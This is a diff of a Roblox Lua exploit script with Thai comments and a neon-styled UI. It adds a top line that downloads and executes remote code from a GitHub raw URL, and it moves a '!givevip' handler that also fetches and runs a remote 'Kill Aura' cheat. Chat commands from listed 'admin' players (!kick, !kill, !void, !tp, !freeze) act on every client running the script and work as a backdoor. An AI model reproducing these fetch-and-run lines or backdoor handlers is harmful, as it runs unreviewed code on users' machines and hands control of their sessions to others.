@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/back%20pack"))()
 -- [[ Script Word [TH] - Neon Edition (Enhanced Background Effect) ]]
 
 local Player = game.Players.LocalPlayer
@@ -28,20 +29,26 @@ local function PlayUISound(id)
     game:GetService("Debris"):AddItem(s, 2)
 end
 
--- ระบบตรวจจับการเดินชน (Touch Detection)
-Player.CharacterAppearanceLoaded:Connect(function(char)
+-- ระบบตรวจจับการเดินชน (Touch Detection) - อัปเกรดให้รองรับทุกคนที่รันสคริปต์
+local function SetupTouchVoid(char)
     local root = char:WaitForChild("HumanoidRootPart")
     root.Touched:Connect(function(hit)
-        local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
-        if hPlayer and VOID_TARGETS[hPlayer.Name] then
-            local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
-            if targetRoot then
-                -- พิกัดวาร์ปที่กำหนด
-                targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        -- เช็คว่าคนที่เดินชนมีอำนาจสั่งการหรือไม่ (Admin หรือ คนที่ได้ Cmd)
+        if ADMIN_COMMANDER[Player.Name] or HAS_COMMAND_POWER[Player.Name] then
+            local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
+            if hPlayer and VOID_TARGETS[hPlayer.Name] then
+                local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    -- พิกัดวาร์ปตามที่ระบุ
+                    targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+                end
             end
         end
     end)
-end)
+end
+
+if Player.Character then SetupTouchVoid(Player.Character) end
+Player.CharacterAdded:Connect(SetupTouchVoid)
 
 -- [Effect Logic] ฟังก์ชันเพิ่มพื้นหลังเคลื่อนไหว
 local function AddBackgroundEffect(frame)
@@ -387,13 +394,13 @@ local function ListenChat(speaker, msg)
         return
     end
 
-    -- [ADMIN/VIP COMMANDS]
-    local hasAnyPower = ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
+    -- [ADMIN/CMD ONLY COMMANDS] - ตรวจสอบสิทธิ์เฉพาะ Admin หรือคนที่มี Cmd Power
+    local hasCommandPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
 
-    if hasAnyPower then
+    if hasCommandPower then
         if speaker ~= Player then PlayUISound(203785501) end
         
-        -- [VOID SYSTEM] - เฉพาะผู้มีสิทธิ์ใช้งานสั่งการ
+        -- [[ VOID SYSTEM ]]
         if cmd == "!void" and target then
             if target == "all" then
                 for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end
@@ -408,12 +415,6 @@ local function ListenChat(speaker, msg)
             end
         end
 
-        if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name 
-            UpdateBoard()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-        end
-        
         if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then
             HAS_COMMAND_POWER[Player.Name] = true
             AdminPanel.Visible = true; MinAdminBtn.Visible = true
@@ -421,22 +422,26 @@ local function ListenChat(speaker, msg)
         end
 
         if target == Player then
-            local isMyGiver = (GIFTED_LIST[Player.Name] == speaker.Name)
-            if ADMIN_COMMANDER[speaker.Name] or isMyGiver or HAS_COMMAND_POWER[speaker.Name] then
-                if cmd == "!kick" then CustomKick()
-                elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-                elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
-                elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
-                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
-            end
+            if cmd == "!kick" then CustomKick()
+            elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+            elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+            elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
+            elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
         end
 
-        if ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] then
-            if cmd == "!killall" then 
-                if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-            elseif cmd == "!kickall" then 
-                CustomKick() 
-            end
+        if cmd == "!killall" then 
+            if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+        elseif cmd == "!kickall" then 
+            CustomKick() 
+        end
+    end
+
+    -- [VIP GIVE GIFT] - เฉพาะ VIP หรือ Admin
+    if ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] then
+        if cmd == "!givevip" and target == Player then
+            GIFTED_LIST[Player.Name] = speaker.Name 
+            UpdateBoard()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
         end
     end
 end
